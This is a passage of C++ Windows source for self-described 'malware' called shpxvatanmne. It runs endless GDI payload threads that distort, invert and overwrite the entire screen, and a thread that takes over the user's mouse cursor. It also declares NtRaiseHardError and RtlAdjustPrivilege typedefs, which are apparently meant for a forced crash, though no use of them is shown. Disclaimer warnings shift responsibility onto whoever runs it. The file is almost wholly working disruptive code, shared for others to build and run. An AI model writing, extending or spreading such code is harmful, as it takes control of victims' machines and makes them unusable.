﻿// shpxvatanmne.cpp : Определете точка влизане на приложението.
//
//
//shpxvatanmne.exe: Callback?
//my new malware, collab with UltraDasher965(my first collab, not fake collab like fuckass MazeIcon)

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <tchar.h>
#include <ctime>
#include <cmath>
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define RGBBRUSH (DWORD)0x1900ac010e
#define random rand
#define DESKTOP_WINDOW ((HWND)0)
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
LPCWSTR lpIconNames[] = { IDI_ERROR, IDI_INFORMATION, IDI_QUESTION, IDI_SHIELD, IDI_WARNING, IDI_WINLOGO };
LPCWSTR lpCursorNames[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
LPCWSTR msgboxtext = L"Warning! This program is a computer virus that known as 'shpxvatanmne'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.";
LPCWSTR finalmsgboxtext = L"Final warning!!!\r\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The author of this computer virus(LambdaTechnology&UltraDasher965) isn't responsible!!!";
LPCWSTR title = L"shpxvatanmne.exe--First Warning";
LPCWSTR finaltitle = L"shpxvatanmne--FINAL WARNING";
using namespace std;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
struct Point3D {
	float x, y, z;
};
float WrapAngle(float angle) {
	while (angle >= 360.0f) angle -= 360.0f;
	while (angle < 0.0f) angle += 360.0f;
	return angle;
}
void DrawEllipseAt(HDC hdc, int x, int y) {
	HINSTANCE HSHELL32 = LoadLibrary(_T("Shell32.dll"));
	HINSTANCE HIMAGERES = LoadLibrary(_T("Imageres.dll"));
	HINSTANCE HMORICONS = LoadLibrary(_T("Moricons.dll"));
	HINSTANCE HPIFMGR = LoadLibrary(_T("Pifmgr.dll"));
	HICON load[9] = { LoadIcon(HSHELL32, MAKEINTRESOURCE(1 + rand() % 336)),LoadIcon(HIMAGERES,MAKEINTRESOURCE(1 + (rand() % 365))),LoadIcon(NULL,MAKEINTRESOURCE(32512 + (rand() % 7))),LoadIcon(HMORICONS,MAKEINTRESOURCE(1 + (rand() % 38))),LoadIcon(HPIFMGR,MAKEINTRESOURCE(1 + (rand() % 113))),LoadCursor(NULL,MAKEINTRESOURCE(101 + rand() % 18)) ,LoadCursor(NULL,MAKEINTRESOURCE(32640 + rand() % 30)) ,LoadCursor(NULL,MAKEINTRESOURCE(32512 * rand() % 5)), LoadCursor(NULL,MAKEINTRESOURCE(32631)) };
	DrawIcon(hdc, x, y, load[rand() % 9]);
}
Point3D RotatePoints(Point3D point, float angleX, float angleY, float angleZ) {
	float cosX = cos(angleX), sinX = sin(angleX);
	float cosY = cos(angleY), sinY = sin(angleY);
	float cosZ = cos(angleZ), sinZ = sin(angleZ);
	float y = point.y * cosX - point.z * sinX;
	float z = point.y * sinX + point.z * cosX;
	point.y = y;
	point.z = z;
	float x = point.x * cosY + point.z * sinY;
	z = -point.x * sinY + point.z * cosY;
	point.x = x;
	point.z = z;
	x = point.x * cosZ - point.y * sinZ;
	y = point.x * sinZ + point.y * cosZ;
	point.x = x;
	point.y = y;
	return point;
}
void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA) {
	Point3D vertices[8] = {
		{-size, -size, -size},
		{size, -size, -size},
		{size, size, -size},
		{-size, size, -size},
		{-size, -size, size},
		{size, -size, size},
		{size, size, size},
		{-size, size, size},
	};
	POINT screenPoints[8];
	for (int i = 0; i < 8; ++i) {
		Point3D rotated = RotatePoints(vertices[i], angleX, angleY, angleZ);
		//COLORREF color = COLORHSL(colorA);
		int screenX = static_cast<int>(center.x + rotated.x);
		int screenY = static_cast<int>(center.y + rotated.y);
		screenPoints[i].x = screenX;
		screenPoints[i].y = screenY;
		DrawEllipseAt(hdc, screenX, screenY);
	}
	POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
	Polyline(hdc, polyline1, 5);
	POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
	Polyline(hdc, polyline2, 5);
	POINT connectingLines[8] = {
		screenPoints[0], screenPoints[4],
		screenPoints[1], screenPoints[5],
		screenPoints[2], screenPoints[6],
		screenPoints[3], screenPoints[7]
	};
	Polyline(hdc, &connectingLines[0], 2);
	Polyline(hdc, &connectingLines[2], 2);
	Polyline(hdc, &connectingLines[4], 2);
	Polyline(hdc, &connectingLines[6], 2);
}
int DrawIconFunction(int x, int y, int size, HICON hIcon) {
	HDC hdc = GetDC(0);
	DrawIconEx(hdc, x, y, hIcon, size, size, NULL, NULL, DI_NORMAL);
	ReleaseDC(0, hdc);
	DestroyIcon(hIcon); DeleteObject(hIcon);
	return 1;
}
VOID WINAPI CircleFunction(HDC hdc, int x, int y, int w, int h) {
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	HBRUSH hBrush = CreateSolidBrush(RndRGB);
	SelectObject(hdc, hBrush);
	BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
	DeleteObject(hrgn); DeleteObject(hBrush);
}
DWORD WINAPI CursorMoving(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int signX = 1, signY = 1, signX1 = 1, signY1 = 1, incrementor = 10, x = 10, y = 10, radius = 100, angle = 0, count = 0;
	POINT cursor;
	CURSORINFO pci;
	while (true) 
	{
		hdc = GetDC(HWND_DESKTOP);
		pci.cbSize = sizeof(pci);
		GetCursorInfo(&pci);
		GetCursorPos(&cursor);
		x += incrementor * signX;
		y += incrementor * signY;
		SetCursorPos(x, y);
		int X = cursor.x + (radius * cos(angle * 3.1415926 / 14)), Y = cursor.y + (radius * sin(angle * 3.1415926 / 14));
		DrawIcon(hdc, X, Y, pci.hCursor);
		DrawIcon(hdc, cursor.x, cursor.y, pci.hCursor);
		if (y >= GetSystemMetrics(SM_CYSCREEN)) { signY = -1; }
		if (x >= GetSystemMetrics(SM_CXSCREEN)) { signX = -1; }
		if (y == 0) { signY = 2; }
		if (x == 0) { signX = 2; }
		angle++;
		if (count == 10) { count = 0; Sleep(1); }
		else { count++; }
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload1_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	double angle = 0.f;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int cx = abs(x - (w / 2));
				int cy = abs(y - (h / 2));
				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;
				int fx = i * ((int)(cbrt((cx * cx) + (cy * cy))) + (((zx + i) ^ (zy - i)) | ((zx - i) & (zy + i))));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		angle += 0.1f;
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload1_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;
	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(0, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, -1, -1, w, h, hdc, 2, 2, SRCCOPY);
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
		SelectObject(hdc, bmpcopy);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
DWORD WINAPI Payload2_num1(LPVOID lparam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true) 
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x += 35) {
			for (int y = 0; y < h; y += 35) {
				if (rand() % 8 != 1) { StretchBlt(hdcCopy, x, y, 35, 35, hdcCopy, x, y, 20, 20, SRCAND); }
				else { StretchBlt(hdcCopy, x, y, 35, 35, hdcCopy, x, y, 20, 20, SRCPAINT); }
			}
		}
		//for (int i = 0; i < w * h; i++) { rgbScreen[i].rgb %= RndRGB; }
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(10);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload2_num2(LPVOID lparam) {//by UltraDasher965
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
		BitBlt(hdc, rand() % 20, 0, w, h, hdc, rand() % 20, 0, NOTSRCCOPY);
		BitBlt(hdc, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, PATINVERT);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
		BitBlt(hdc, rand() % w, 10 - rand() % 20, 100, h, hdc, rand() % w, rand() % 20, SRCCOPY);
		BitBlt(hdc, 10 - rand() % 20, rand() % h, w, 100, hdc, rand() % 20, rand() % h, SRCCOPY);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload2_num3(LPVOID lpParam) {
	HICON hIcon;
	int size = 0, w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	srand(time(NULL));
	while (true) 
	{
		hIcon = LoadIcon(0, lpIconNames[rand() % 6]); size = 32 + rand() % 118;
		DrawIconFunction(rand() % w, rand() % h, size, hIcon);
		Sleep(20);
		hIcon = LoadCursor(0, lpCursorNames[rand() % 16]); size = 32 + rand() % 118;
		DrawIconFunction(rand() % w, rand() % h, size, hIcon);
		Sleep(20);
	}
}
DWORD WINAPI Payload3_num1(LPVOID lparam) {//by UltraDasher965, but i add patinvert
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(hdcCopy, bmp);
	RECT rect;
	POINT lpt[3];
	while (true)
	{
		hdc = GetDC(0);
		INT counter = sin(i / 10.f) * 100;
		GetWindowRect(GetDesktopWindow(), &rect);
		lpt[0].x = rect.left + counter;
		lpt[0].y = rect.top - counter;
		lpt[1].x = rect.right + counter;
		lpt[1].y = rect.top + counter;
		lpt[2].x = rect.left - counter;
		lpt[2].y = rect.bottom - counter;
		PlgBlt(hdc, lpt, hdc, rect.left - 20, rect.top - 20, (rect.right - rect.left) + 40, (rect.bottom - rect.top) + 40, 0, 0, 0);
		i++;
		SelectObject(hdc, CreateSolidBrush(RndRGB));
		PlgBlt(hdcCopy, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload3_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		HDC hdc = GetDC(0);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX), hdpi = GetDeviceCaps(hdc, LOGPIXELSY), a = 1 + rand() % 64, b = 1 + rand() % 64;
		for (int y = 0; y <= h; y += 16 * wdpi / 96) {
			if (rand() % 2 == 0) { StretchBlt(hdc, -a * tan((float)b * y), y, w, 10, hdc, 0, y, w, 10, NOTSRCCOPY); }
			else { StretchBlt(hdc, -a * sin((float)b * y), y, w, 10, hdc, 0, y, w, 10, NOTSRCERASE); }
			Sleep(1);
		}
		ReleaseDC(NULL, hdc);
	}
	return 0;
}
DWORD WINAPI Payload4_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int i = 0, xxx = 0, w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 40, w, h, 1, 24 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
	PRGBQUAD prgbScreen = { 0 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, 0, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	while (true) 
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				prgbScreen[index].r = sin((x + i) * (3.1415926 / (w / 50))) * 128 + 128;
				prgbScreen[index].g = cos(((x ^ y) + xxx) * ((w + h) / 4)) * 32;
				prgbScreen[index].b = sin((y + i) * (3.1415926 / (w / 50))) * 128 + 128;
			}
		}
		for (int y = 0; y < h; y += 20) { StretchBlt(hdcCopy, -1 + rand() % 3, y, w, 20, hdcCopy, 0, y, w, 20, SRCAND); }
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(1);
		i += 5, xxx += 20;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload5_num1(LPVOID lparam) {//credits to camellia-y7x, but i modified it
	srand(time(NULL));
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2), rndsize2 = 1 + rand() % (h / 2), xxx = 0, yyy = 2;
	double angle = 0;
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	BLENDFUNCTION blur = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
	while (true) 
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			rgbScreen[i].rgb += yyy ^ (i | xxx + ((x + xxx) ^ (x >> y)));
		}
		for (int yyy = 0; yyy < h; yyy += rndsize) { StretchBlt(hdcCopy, -2 + rand() % 5, yyy, w, rndsize, hdcCopy, 0, yyy, w, rndsize, SRCPAINT); }
		for (int yyy = 0; yyy < h; yyy += rndsize2) { StretchBlt(hdcCopy, -5 + rand() % 11, yyy, w, rndsize2, hdcCopy, 0, yyy, w, rndsize2, SRCAND); }
		for (float i = 0; i < w + h; i += 0.99f) {
			int a = sin(angle) * 360;
			BitBlt(hdc, 0, i, w, 1, hdc, a, i, SRCCOPY);
			angle += PI / 3;
			DeleteObject(&i); DeleteObject(&a);
		}
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
		Sleep(1);
		xxx += 4;
		yyy ^= 2;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload5_num2(LPVOID lparam) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL), hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		LPCSTR text = "       ";
		int a, fontx = rand() % w, fonty = rand() % h, xx = rand() % w, yy = rand() % h;
		SetBkColor(hcdc, RndRGB);
		SetTextColor(hcdc, RndRGB);
		HFONT font = CreateFont(48, 24, 0, 0, rand() % 901, true, true, true, ANSI_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, L"Comic Sans MS");
		SelectObject(hcdc, font);
		TextOutA(hcdc, fontx, fonty, text, strlen(text));
		POINT point[3];
		point[0].x = xx; point[0].y = yy;
		point[1].x = xx + rand() % (w - xx); point[1].y = yy + rand() % (h - yy);
		point[2].x = rand() % (w + xx); point[2].y = rand() % (h + yy);
		int textw = strlen(text);
		PlgBlt(hdc, point, hcdc, fontx, fonty, textw * 24, 48, 0, fontx, fonty);
		//BitBlt(hdc, fontx, fonty, textw[tmp] * a / 2, a, hcdc, fontx, fonty, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteObject(font);
		DeleteObject(point);
		Sleep(5);
	}
	DeleteDC(hcdc);
	DeleteObject(hBitmap);
	return 0;
}
DWORD WINAPI Payload6_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	PRGBQUAD rgbScreen = { 0 };
	bmp = CreateDIBSection(hdc, &bmpi, NULL, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += ~(x & y) | ((y + x) * i);
		}
		i++;
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}

DWORD WINAPI Payload6_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdc, -10, -10, (w / 2) + 20, (h / 2) + 20, hdc, 0, 0, w / 2, h / 2, SRCCOPY);
		StretchBlt(hdc, (w / 2) + 10, 10, (w / 2) - 20, (h / 2) - 20, hdc, w / 2, 0, w / 2, h / 2, SRCCOPY);
		StretchBlt(hdc, 10, (h / 2) + 10, (w / 2) - 20, (h / 2) - 20, hdc, 0, h / 2, w / 2, h / 2, SRCCOPY);
		StretchBlt(hdc, (w / 2) - 10, (h / 2) - 10, (w / 2) + 20, (h / 2) + 20, hdc, w / 2, h / 2, w / 2, h / 2, SRCCOPY);
		Sleep(100);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Payload7_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0, rndsize = 1 + rand() % (h / 2), xxx = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true) 
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				FLOAT fx = ((x ^ y) + (i * (2 | xxx)) + (xxx & y) + (i * 10));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h += fmod(fx / 200, 1.f);
				hslcolor.s += 1.f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
